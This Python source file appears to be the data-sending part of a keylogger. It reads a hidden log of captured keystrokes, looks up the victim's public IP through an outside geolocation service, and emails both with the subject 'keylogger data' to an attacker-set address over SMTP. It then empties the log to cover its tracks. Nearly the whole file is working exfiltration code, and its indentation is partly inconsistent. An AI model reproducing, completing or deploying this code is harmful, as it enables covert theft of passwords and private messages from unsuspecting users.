from requests import get
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from json import loads, dumps
from datetime import datetime


def get_ip():
    response = get("http://ip-api.com/json/")
    try:
        response.raise_for_status()
    except Exception as exc:
        with open("data/.log", "w") as f:
            f.write("\n[ERROR] => Getting IP error: %s\n" % (exc))
            f.close()
	return
    else:
	return loads(response.text)


def send_data(smtp_credentials):
    try:
        with SMTP(smtp_credentials["host"], smtp_credentials["port"]) as obj:
            msg = MIMEMultipart()
            msg['Subject'] = 'keylogger data'
            msg['From'] = smtp_credentials["from"]
            msg['To'] = smtp_credentials["to"]

            log_file = open("data/.log", "r")

            msg.attach(MIMEText(dumps({
                "datetime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "ip": get_ip(),
                "log": log_file.read()
            })))

            log_file.close()

            obj.ehlo()
            obj.starttls()
            obj.login(smtp_credentials["from"], smtp_credentials["password"])
            obj.sendmail(smtp_credentials["from"], smtp_credentials["to"], msg.as_string())
            obj.quit()

    except Exception as exc:
        with open("data/.log", "w") as f:
            f.write("\n[ERROR] => %s\n" % exc)
            f.close()
    finally:
        with open("data/.log", "w") as f:
            f.write("")
            f.close()
